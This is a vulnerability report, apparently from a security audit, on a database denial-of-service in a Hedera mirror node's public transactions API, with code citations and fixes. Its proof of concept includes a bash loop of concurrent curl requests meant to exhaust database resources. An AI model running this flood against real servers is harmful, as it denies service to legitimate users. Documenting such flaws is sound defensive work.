### Title
Unauthenticated DISTINCT ON + JOIN Query DoS via Combined `account.id` and `transactiontype` Filters in GET /transactions

### Summary
Any unauthenticated external user can trigger an expensive `DISTINCT ON` query with a `JOIN` against the `transaction` table on both the `crypto_transfer` and `token_transfer` subqueries by supplying both `account.id` and `transactiontype` query parameters to `GET /api/v1/transactions`. The `LIMIT` clause does not prevent the database from performing the full join-and-sort before returning results, enabling repeated requests to exhaust database CPU and I/O resources.

### Finding Description

**Exact code path:**

In `rest/transactions.js`, `extractSqlFromTransactionsRequest()` (lines 375–444) builds two independent query fragments from user-supplied HTTP query parameters:

- `account.id=X` → sets `accountQuery` to a non-empty string (lines 390–419)
- `transactiontype=Y` → sets `transactionTypeQuery` to a non-empty string (lines 412–414, 431) [1](#0-0) [2](#0-1) 

`getTransactionTimestampsQuery()` (line 555) gates the expensive path on `creditDebitQuery || accountQuery`: [3](#0-2) 

When `accountQuery` is non-empty (i.e., `account.id` was supplied), `getTransferDistinctTimestampsQuery()` is called for **both** `crypto_transfer` and `token_transfer` tables, passing the user-controlled `transactionTypeQuery` as an argument.

Inside `getTransferDistinctTimestampsQuery()` (lines 325–356), the JOIN clause is unconditionally constructed whenever `resultTypeQuery || transactionTypeQuery` is truthy:

```javascript
const joinClause =
  (resultTypeQuery || transactionTypeQuery) &&
  `join ${Transaction.tableName} as ${Transaction.tableAlias}
    using (${Transaction.CONSENSUS_TIMESTAMP}, ${Transaction.PAYER_ACCOUNT_ID})`;
``` [4](#0-3) 

This produces the following SQL for each of the two subqueries:

```sql
SELECT DISTINCT ON (ctl.consensus_timestamp)
    ctl.consensus_timestamp AS consensus_timestamp,
    ctl.payer_account_id    AS payer_account_id
FROM crypto_transfer AS ctl
JOIN transaction AS t USING (consensus_timestamp, payer_account_id)
WHERE ctl.entity_id = $1
  AND ctl.consensus_timestamp >= $2 AND ctl.consensus_timestamp <= $3
  AND t.type = $4
ORDER BY ctl.consensus_timestamp DESC LIMIT $5
```

**Root cause / failed assumption:** The code assumes that the `LIMIT` clause bounds the work PostgreSQL must perform. It does not. PostgreSQL's `DISTINCT ON` with `ORDER BY` requires a full sort of all qualifying rows from the join before it can emit the first `LIMIT` rows. For high-cardinality accounts (e.g., treasury `0.0.98`, exchange accounts), the `crypto_transfer` table can contain millions of rows, and joining each against the `transaction` table is proportionally expensive. There is no authentication, rate-limiting, or query-cost guard in `getTransactions()`: [5](#0-4) 

### Impact Explanation

An attacker can repeatedly issue:

```
GET /api/v1/transactions?account.id=0.0.98&transactiontype=CRYPTOTRANSFER
```

Each request causes the database to execute two expensive `DISTINCT ON` + `JOIN transaction` subqueries (one for `crypto_transfer`, one for `token_transfer`). With concurrent requests targeting a high-volume account, this can saturate database CPU and I/O, degrading or denying service to all other API consumers. Because the mirror node serves as the primary read API for the Hedera network, this constitutes a non-network-based DoS against a critical piece of infrastructure.

### Likelihood Explanation

- **No authentication required**: the endpoint is fully public.
- **No rate limiting visible** in the handler code path.
- **Trivially reproducible**: a single `curl` command suffices; no special knowledge or tooling needed.
- **Amplifiable**: targeting accounts with the largest transfer history (publicly known from the ledger) maximizes per-request cost.
- **Repeatable at will**: the attacker can sustain the attack indefinitely with minimal resources.

### Recommendation

1. **Decouple the JOIN trigger from user input**: only add the `JOIN transaction` clause when `transactionTypeQuery` is non-empty AND the query planner can use an index-only path (e.g., enforce a tight timestamp range before joining).
2. **Apply a mandatory, narrow timestamp range** when both `account.id` and `transactiontype` are present, bounding the scan size before the join.
3. **Add rate limiting** (e.g., per-IP or per-account-id) at the API gateway or middleware layer for the `/transactions` endpoint.
4. **Consider a query timeout** at the database connection level for REST API queries to prevent runaway joins from holding connections indefinitely.

### Proof of Concept

```bash
# Trigger the DISTINCT ON + JOIN path with no credentials
curl -s "https://<mirror-node-host>/api/v1/transactions?account.id=0.0.98&transactiontype=CRYPTOTRANSFER&limit=25"

# Concurrent flood to exhaust DB resources
for i in $(seq 1 50); do
  curl -s "https://<mirror-node-host>/api/v1/transactions?account.id=0.0.98&transactiontype=CRYPTOTRANSFER&limit=25" &
done
wait
```

Each request causes PostgreSQL to execute:
```sql
SELECT DISTINCT ON (ctl.consensus_timestamp) ...
FROM crypto_transfer AS ctl
JOIN transaction AS t USING (consensus_timestamp, payer_account_id)
WHERE ctl.entity_id = <0.0.98 encoded id>
  AND t.type = <CRYPTOTRANSFER proto id>
ORDER BY ctl.consensus_timestamp DESC LIMIT 25
```
repeated for `token_transfer` as well, with no server-side guard preventing concurrent execution of arbitrarily many such queries.

### Citations

**File:** rest/transactions.js (L339-355)
```javascript
  const joinClause =
    (resultTypeQuery || transactionTypeQuery) &&
    `join ${Transaction.tableName} as ${Transaction.tableAlias}
      using (${Transaction.CONSENSUS_TIMESTAMP}, ${Transaction.PAYER_ACCOUNT_ID})`;
  const whereClause = buildWhereClause(
    accountQuery,
    transferTimestampQuery,
    resultTypeQuery,
    transactionTypeQuery,
    creditDebitQuery
  );

  return `
      select distinct on (${fullTimestampColumn}) ${fullTimestampColumn}      as consensus_timestamp,
                                                  ${fullPayerAccountIdColumn} as payer_account_id
      from ${tableName} as ${tableAlias} ${joinClause} ${whereClause}
      order by ${fullTimestampColumn} ${order} ${limitQuery}`;
```

**File:** rest/transactions.js (L390-431)
```javascript
      case constants.filterKeys.ACCOUNT_ID:
        if (operator === utils.opsMap.eq) {
          accountIdEqValues.push(value);
        } else {
          accountConditions.push(`ctl.entity_id${operator}$${params.push(value)}`);
        }
        break;
      case constants.filterKeys.CREDIT_TYPE:
        if (lastCreditDebitValue !== null && lastCreditDebitValue !== value) {
          return null;
        }
        lastCreditDebitValue = value;
        break;
      case constants.filterKeys.LIMIT:
        limit = value;
        break;
      case constants.filterKeys.ORDER:
        order = value;
        break;
      case constants.filterKeys.RESULT:
        resultType = value;
        break;
      case constants.filterKeys.TRANSACTION_TYPE:
        transactionTypes.push(TransactionType.getProtoId(value));
        break;
    }
  }

  accountConditions.push(getQueryWithEqualValues('ctl.entity_id', params, accountIdEqValues));
  const accountQuery = accountConditions.filter(Boolean).join(' and ');

  if (lastCreditDebitValue) {
    const operator = lastCreditDebitValue.toLowerCase() === constants.cryptoTransferType.CREDIT ? '>' : '<';
    creditDebitQuery = `ctl.amount ${operator} 0`;
  }

  if (resultType) {
    const operator = resultType === constants.transactionResultFilter.SUCCESS ? 'in' : 'not in';
    resultTypeQuery = `t.result ${operator} (${utils.resultSuccess})`;
  }

  const transactionTypeQuery = getQueryWithEqualValues('type', params, transactionTypes);
```

**File:** rest/transactions.js (L555-578)
```javascript
  if (creditDebitQuery || accountQuery) {
    const cryptoTransferQuery = getTransferDistinctTimestampsQuery(
      CryptoTransfer.tableName,
      'ctl',
      timestampQuery,
      resultTypeQuery,
      transactionTypeQuery,
      accountQuery,
      creditDebitQuery,
      order,
      limitQuery
    );

    const tokenTransferQuery = getTransferDistinctTimestampsQuery(
      TokenTransfer.tableName,
      'ttl',
      timestampQuery,
      resultTypeQuery,
      transactionTypeQuery,
      accountQuery.replace(/ctl\.entity_id/g, 'ttl.account_id'),
      creditDebitQuery.replace(/ctl\.amount/g, 'ttl.amount'),
      order,
      limitQuery
    );
```

**File:** rest/transactions.js (L671-677)
```javascript
const getTransactions = async (req, res) => {
  const filters = utils.buildAndValidateFilters(req.query, acceptedTransactionParameters);
  const timestampFilters = filters.filter((filter) => filter.key === constants.filterKeys.TIMESTAMP);
  const timestampRange = utils.parseTimestampFilters(timestampFilters, false, true, true, false, false);

  res.locals[constants.responseDataLabel] = await doGetTransactions(filters, req, timestampRange);
};
```
